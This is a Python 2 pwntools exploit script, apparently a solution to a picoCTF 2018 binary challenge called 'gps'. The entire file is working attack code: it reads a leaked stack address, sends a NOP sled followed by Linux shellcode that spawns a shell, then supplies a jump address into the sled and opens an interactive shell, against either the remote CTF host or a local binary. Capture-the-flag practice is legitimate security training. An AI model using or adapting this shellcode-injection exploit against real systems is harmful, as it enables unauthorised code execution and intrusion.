
#!/usr/bin/python2

from pwn import *
import sys

LOCAL = True

context.arch = 'x86_64'
context.os = 'linux'

def info(s):
	log.info(s)


def exploit(r):
	r.readuntil("Current position:")
	stack = (r.readline().strip())
	#print(stack)

	# Send Shell
	r.readuntil(">")
	shell = asm(shellcraft.linux.sh())
	r.sendline("\x90"*0x200+shell)

	# Jump to Shell
	r.readuntil(">")
	#print(hex((int(stack,16) + 0x100)))
	r.sendline(hex((int(stack,16) + 0x100)))

	r.interactive()
	return


if __name__ == '__main__':

	# e = ELF('./auth')
	HOST, PORT = "2018shell2.picoctf.com", 58896
	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process(['./gps'])
		print util.proc.pidof(r)
		pause()
		exploit(r)